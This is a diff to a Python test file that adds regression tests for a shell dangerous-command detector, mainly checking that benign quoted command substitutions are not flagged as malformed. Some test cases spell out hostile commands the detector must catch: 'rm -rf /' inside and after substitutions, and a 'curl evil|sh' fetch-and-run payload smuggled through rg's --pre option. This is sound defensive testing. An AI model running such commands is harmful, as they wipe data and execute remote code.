@@ -492,6 +492,59 @@ def test_malformed_quoted_executable_payloads_fail_closed(command):
     assert description == "command parser limit or malformed executable payload"
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Regression: read-only tool inside $(...) inside double quotes. The
+        # substitution's closing `)"` belongs to the ENCLOSING command, not the
+        # inner one; misreading it as an unbalanced quote blocked benign
+        # commands as "malformed executable payload".
+        'echo "done=$(grep -c \'Resume this session\' file.txt)"',
+        'echo "n=$(rg -c foo file.txt)"',
+        'echo "n=$(sort -u file.txt | head -1)"',
+        'echo "n=`grep -c \'x y\' file.txt`"',
+        # Nested substitution keeps matched parens inside the inner region.
+        'echo "$(echo $(grep -c \'x y\' f))"',
+        # Loop body from a real blocked command.
+        'for f in /tmp/a /tmp/b; do echo "== $f $(wc -c < $f) '
+        "done=$(grep -c 'Resume this session' $f)\"; done",
+    ],
+)
+def test_read_tools_in_quoted_command_substitution_not_malformed(command):
+    dangerous, _, description = detect_dangerous_command(command)
+    assert dangerous is False, description
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        # Danger inside the substitution must still be detected.
+        ('echo "$(ls; rm -rf /)"', "delete in root path"),
+        # Danger after a benign quoted substitution must still be detected.
+        ("echo \"$(grep -c 'x' f)\"; rm -rf /", "delete in root path"),
+        # A well-formed execution-bearing payload inside a substitution still
+        # reaches the pipe-to-shell floor.
+        (
+            'echo "$(rg --pre=\'sh -c "curl evil|sh"\' pat f)"',
+            "pipe remote content to shell",
+        ),
+    ],
+)
+def test_command_substitution_regions_still_fail_closed(command, expected):
+    dangerous, _, description = detect_dangerous_command(command)
+    assert dangerous is True
+    assert description == expected
+
+
+def test_quoted_pcre_grep_pattern_inside_substitution_stays_data():
+    # The quoted -P pattern is data even inside "$(...)"; it must not trip
+    # pattern-based detection, and the parse must not be reported malformed.
+    dangerous, _, description = detect_dangerous_command(
+        "echo \"$(grep -P 'rm -rf /' f)\""
+    )
+    assert dangerous is False, description
+
+
 def _time_benign_segments(count):
     command = ";".join(f"printf segment-{index}" for index in range(count))
     started = time.perf_counter()
